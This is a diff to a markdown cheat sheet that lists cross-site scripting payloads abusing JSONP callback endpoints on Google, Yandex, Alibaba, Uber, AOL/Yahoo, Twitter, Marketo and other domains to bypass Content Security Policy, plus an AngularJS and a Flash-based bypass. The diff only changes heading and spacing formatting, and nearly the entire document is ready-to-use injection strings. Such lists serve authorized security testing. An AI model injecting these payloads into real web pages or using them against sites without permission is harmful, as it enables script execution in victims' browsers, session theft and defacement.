@@ -1,5 +1,6 @@
 ## Google.com
 <li>Payloads</li>
+
 ```
 "><script+src="https://googleads.g.doubleclick.net/pagead/conversion/1036918760/wcm?callback=alert(1337)"></script>
 "><script+src="https://www.googleadservices.com/pagead/conversion/1070110417/wcm?callback=alert(1337)"></script>
@@ -7,28 +8,32 @@
 "><script+src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
 ```
 
-##Blogger.com
+## Blogger.com
 <li>Payloads</li>
+
 ```
 "><script+src="https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback=alert(1337)"></script>
 ```
 
-##Yandex
+## Yandex
 <li>Payloads</li>
+
 ```
 "><script+src="https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert(1337)"></script>
 "><script+src="https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback=alert"></script>
 ```
 
-#Marketo
+## Marketo
 <li>Payloads</li>
+
 ```
 "><script+src="http://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>
 "><script+src="http://app-e.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>
 ```
 
-##Alibaba
+## Alibaba
 <li>Payloads</li>
+
 ```
 "><script+src="https://detector.alicdn.com/2.7.3/index.php?callback=alert(1337)"></script>
 "><script+src="https://suggest.taobao.com/sug?callback=alert(1337)"></script>
@@ -39,14 +44,16 @@
 "><script+src="http://api.m.sm.cn/rest?method=tools.sider&callback=jsonp_1869510867%3balert(1)%2f%2f794"></script>
 ```
 
-##Uber.com
+## Uber.com
 <li>Payloads</li>
+
 ```
 "><script+src="https://mkto.uber.com/index.php/form/getKnownLead?callback=alert(document.domain);"></script>
 ```
 
-##AOL/Yahoo
+## AOL/Yahoo
 <li>Payloads</li>
+
 ```
 "><script+src="https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback=confirm(9)//jQuery1120033838593671435757_1537274810388&_=1537274810389"></script>
 "><script+src="https://df-webservices.comet.aol.com/sigfig/ws?service=sigfig_portfolios&porttype=2&portmax=5&rf=http://www.dailyfinance.com&callback=jsonCallback24098%3balert(1)%2f%2f476&_=1537149044679"></script>
@@ -57,23 +64,25 @@
 "><script+src="http://portal.pf.aol.com/jsonmfus/?service=myportfolios,&porttype=1&portmax=100&callback=confirm(9)//jQuery1710788849030856973_1538354104695&_=1538354109053"></script>
 ```
 
-##Twitter.com
+## Twitter.com
 <li>Payloads</li>
+
 ```
 "><script+src="http://search.twitter.com/trends.json?callback=alert()"></script>
 "><script+src="https://twitter.com/statuses/user_timeline/yakumo119info.json?callback=confirm()"></script>
 "><script+src="https://twitter.com/status/user_timeline/kbeautysalon.json?count=1&callback=confirm()"></script>
 ```
 
-##GoogleAPI's
+## GoogleAPI's
 <li>Payloads</li>
+
 ```
 "><embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){alert(1337)}//' allowscriptaccess=always>
 "><script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
 ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
 ```
 
-##Others
+## Others
 <li>Payloads</li>
 ```
 "><script+src="https://www.sharethis.com/get-publisher-info.php?callback=alert(1337)"></script>
